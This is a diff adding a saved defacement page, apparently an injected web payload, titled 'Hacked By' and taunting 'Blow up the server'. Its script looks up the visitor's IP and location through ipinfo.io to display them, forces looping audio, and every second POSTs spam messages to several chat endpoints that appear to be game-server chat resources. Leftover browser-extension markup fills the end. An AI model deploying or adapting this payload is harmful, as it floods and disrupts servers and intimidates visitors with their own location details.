@@ -1,0 +1,165 @@
+
+<!-- saved from url=(0033)https://lyrica1xssss.netlify.app/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>body {transition: opacity ease-in 0.2s; } 
+body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
+</style>
+
+<title>حوسي بقلك </title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+
+body{
+    font-family: monospace;
+    color: #fff;
+    text-align: center;
+    min-height: 100vh;
+    padding-top: 60px;
+    overflow: hidden;
+}
+
+/* الصورة الخلفية */
+.bg-image{
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    object-fit: cover;
+    z-index: -100;
+    pointer-events: none;
+}
+
+.overlay{
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.45);
+    backdrop-filter: blur(4px);
+    z-index: -50;
+}
+
+.top-img img{width:140px}
+
+@keyframes rgb3{
+0%{color:#000}
+33%{color:#ff0000}
+66%{color:#fff}
+100%{color:#000}
+}
+
+@keyframes LYRICA{
+0%{color:#fff}
+50%{color:#ff0000}
+100%{color:#fff}
+}
+
+.hacked{
+    margin-top:20px;
+    font-size:36px;
+    text-shadow:0 0 10px #000,0 0 15px #ff0000;
+    animation: rgb3 2.5s infinite
+}
+
+.hacked .name{animation: LYRICA 1.2s infinite}
+
+.discord{margin-top:10px;font-size:18px}
+.discord a{color:#ff6a00;text-decoration:none}
+
+.msg{margin-top:8px;font-size:18px;animation: rgb3 2.5s infinite}
+
+.ip{margin-top:20px;font-size:16px}
+.ipinfo-title{margin-top:6px;font-size:15px}
+
+.info{
+    margin-top:10px;
+    font-size:14px;
+    line-height:1.5;
+    color:#ff6a00
+}
+
+.down{
+    margin-top:25px;
+    font-size:22px;
+    color:red;
+    text-shadow:0 0 10px red
+}
+</style>
+</head>
+<body>
+
+<!-- الخلفية صورة -->
+<img class="bg-image" src="https://cdn.discordapp.com/attachments/1330088643129249802/1523269131099705464/download_4.gif?ex=6a4b7e6d&is=6a4a2ced&hm=e3332f5074f5971a33f1c864f800aca0b721619cbe552ce6d773abfbf7ee4f54&">
+
+<div class="overlay"></div>
+
+<div class="top-img">
+<img src="https://cdn.discordapp.com/attachments/1330088643129249802/1523269131099705464/download_4.gif?ex=6a4b7e6d&is=6a4a2ced&hm=e3332f5074f5971a33f1c864f800aca0b721619cbe552ce6d773abfbf7ee4f54&">
+</div>
+
+<div class="hacked">
+Hacked By [ <span class="name">ليش مشغل هاك </span> ]
+</div>
+
+<div class="discord">
+<a href="https://discord.gg/512 ">Discord.gg/512 </a>
+</div>
+
+<div class="msg">عليك باند نهائي . Blow up the server</div>
+
+<!-- IP وعرض المعلومات -->
+<div class="ip">
+Your IP Address: <span id="ip">0.0.0</span>
+</div>
+
+<div class="down">Oops, your server is down!</div>
+
+<!-- الصوت -->
+<audio id="bg-audio" loop="">
+    <source src="https://files.catbox.moe/f2bv83.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+// جلب IP وعرض المعلومات
+fetch("https://ipinfo.io/json")
+.then(response => response.json())
+.then(data => {
+    document.getElementById("ip").textContent = data.ip;
+    document.getElementById("info").innerHTML =
+        "City: " + data.city + "<br>" +
+        "Region: " + data.region + "<br>" +
+        "Country: " + data.country + "<br>" +
+        "Location: " + data.loc + "<br>" +
+        "Org: " + data.org + "<br>" +
+        "Timezone: " + data.timezone;
+})
+.catch(() => {
+    document.getElementById("ip").textContent = "Unavailable";
+    document.getElementById("info").innerHTML = "IP info not available.";
+});
+
+// تشغيل الصوت تلقائياً
+window.addEventListener("load", function() {
+    const audio = document.getElementById("bg-audio");
+    audio.volume = 10000.7; // مستوى الصوت
+    audio.play().catch(() => {
+        // إذا منع المتصفح التشغيل التلقائي
+        document.body.addEventListener("click", () => {
+            audio.play();
+        }, { once: true });
+    });
+});
+</script>
+<script>
+const msg = `^3`;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+</script>
+
+<veepn-lock-screen><template shadowrootmode="open"><style>html{box-sizing:border-box;-webkit-text-size-adjust:100%;-moz-text-size-adjust:100%;text-size-adjust:100%;word-break:normal;tab-size:4}*,:before,:after{box-sizing:border-box;background-repeat:no-repeat}:before,:after{-webkit-text-decoration:inherit;text-decoration:inherit;vertical-align:inherit}*{margin:0;padding:0}hr{height:0;color:inherit;border:0;border-top:1px solid;overflow:visible}details,main{display:block}summary{display:list-item}small{font-size:80%}[hidden]{display:none!important}abbr[title]{border-bottom:none;-webkit-text-decoration:underline dotted;text-decoration:underline dotted}a{background-color:#0000}a:active,a:hover{outline-width:0}code,kbd,pre,samp{font-family:monospace}pre{font-size:1em}b,strong{font-weight:bolder}sub,sup{vertical-align:baseline;font-size:75%;line-height:0;position:relative}sub{bottom:-.25em}sup{top:-.5em}table{border-color:inherit;text-indent:0}iframe{border-style:none}input{border-radius:0}[type=number]::-webkit-inner-spin-button{height:auto}[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-decoration{appearance:none}textarea{resize:vertical;overflow:auto}button,input,optgroup,select,textarea{font:inherit;color:inherit}optgroup{font-weight:700}button{overflow:visible}button,select{text-transform:none}button,[type=button],[type=reset],[type=submit],[role=button]{cursor:pointer}button::-moz-focus-inner{border-style:none;padding:0}[type=button]::-moz-focus-inner{border-style:none;padding:0}[type=reset]::-moz-focus-inner{border-style:none;padding:0}[type=submit]::-moz-focus-inner{border-style:none;padding:0}button,html [type=button],[type=reset],[type=submit]{appearance:auto}button,input,select,textarea{background-color:#0000;border-style:none}button:-moz-focusring{outline:1px dotted buttontext}[type=button]::-moz-focus-inner{outline:1px dotted buttontext}[type=reset]::-moz-focus-inner{outline:1px dotted buttontext}[type=submit]::-moz-focus-inner{outline:1px dotted buttontext}select{appearance:none}a:focus,button:focus,input:focus,select:focus,textarea:focus{outline-width:0}select::-ms-expand{display:none}select::-ms-value{color:currentColor}legend{color:inherit;white-space:normal;border:0;max-width:100%;display:table}::-webkit-file-upload-button{appearance:auto;color:inherit;font:inherit}[disabled]{cursor:default}img{border-style:none}progress{vertical-align:baseline}[aria-busy=true]{cursor:progress}[aria-controls]{cursor:pointer}[aria-disabled=true]{cursor:default}ul,ol{list-style-type:none}figure{margin:0}@keyframes slide-in{0%{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0%)}}.gradient-blue{background:radial-gradient(106.41% 128.47% at 50.15% 128.47%,#23abff 0%,#3066ff 100%)}.gradient-green{background:radial-gradient(92.26% 118.88% at 50.15% .13%,#00c3c3 0%,#00aab3 100%)}.gradient-purple{background:radial-gradient(165.12% 115.56% at 50.15% .13%,#a15aff 0%,#00a0eb 100%)}.bg-blue{background-color:#f2f5ff}.bg-purple{background-color:#f7f0ff}.bg-green{background-color:#ebffed}.lock-screen{letter-spacing:normal;z-index:2147483638;border-radius:24px;width:327px;font-family:FigtreeVF,sans-serif;animation:.3s ease-in-out forwards slide-in;position:fixed;bottom:24px;right:24px;overflow:hidden;box-shadow:0 24px 32px #00000014}.lock-screen__content{padding:24px 24px 64px;position:relative}.lock-screen__close{opacity:.5;justify-content:center;align-items:center;width:24px;height:24px;display:flex;position:absolute;top:16px;right:16px}.lock-screen__label{color:#fff;background-color:#fff3;border-radius:50px;justify-content:center;align-items:center;gap:8px;width:fit-content;height:26px;margin:-8px auto 16px;padding-inline:16px;font-size:12px;line-height:18px;display:flex}.lock-screen__title{color:#fff;text-align:center;margin-bottom:8px;font-size:20px;font-weight:600;line-height:28px}.lock-screen__description{color:#f5f6f7;text-align:center;font-size:14px;line-height:20px}.lock-screen__description b{font-weight:600}.lock-screen__card{z-index:1;background-color:#fff;border-radius:24px;margin-top:-44px;padding:32px 20px 20px;position:relative}.lock-screen__inner{margin-bottom:24px}.lock-screen__submit{color:#fff;background-color:#f70;border-radius:12px;justify-content:center;align-items:center;gap:10px;width:100%;height:40px;margin-bottom:16px;padding-inline:16px;font-size:16px;font-weight:700;display:flex}.lock-screen__skip{color:#82829c;justify-content:center;align-items:center;margin-inline:auto;font-size:14px;line-height:20px;display:flex}.price-card{background:linear-gradient(254.14deg,#fafbff .04%,#f5f8ff 100.04%);border:1px solid #f2f2fc;border-radius:24px;padding:24px 28px}.price-card__label{color:#4a5764;text-align:center;text-transform:uppercase;margin-bottom:16px;font-size:14px;line-height:20px}.price-card__price{justify-content:center;align-items:flex-start;column-gap:2px;margin-bottom:12px;display:flex}.price-card__currency{color:#515478;font-size:18px;line-height:28px}.price-card__number{color:#14142a;text-align:center;font-size:64px;line-height:54px}.price-card__wrap{flex-direction:column;display:flex}.price-card__decimal{color:#515478;font-size:18px;font-weight:600;line-height:28px}.price-card__period{color:#515478;margin-top:-6px;font-size:14px;line-height:20px}.price-card__discount{justify-content:center;align-items:center;margin-bottom:12px;display:flex;position:relative}.price-card__discount-divider{z-index:0;background-color:#dbe2f9;width:100%;height:1px;position:absolute;top:50%;left:0;transform:translateY(-50%)}.price-card__discount-icon{z-index:1;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}.price-card__discount-text{z-index:2;color:#fff;font-size:12px;font-weight:600;line-height:18px;position:relative}.price-card__features{justify-content:center;align-items:center;column-gap:16px;display:flex}.price-card__feature{color:#222e3a;align-items:center;gap:6px;font-size:14px;line-height:20px;display:flex}.price-card__feature:before{content:"";background-color:#20df9e;border-radius:50%;flex-shrink:0;width:4px;height:4px;display:block}.features-list{grid-template-columns:repeat(3,1fr);gap:12px;display:grid}.features-list__item{flex-direction:column;align-items:center;gap:6px;display:flex}.features-list__icon{border-radius:12px;justify-content:center;align-items:center;width:52px;height:52px;display:flex}.features-list__text{color:#293a53;text-align:center;letter-spacing:-.1px;font-size:16px;line-height:24px}</style></template><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2)format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2)format("woff2-variations");font-weight:100 1000;font-display:swap}</style></veepn-lock-screen></body></html>
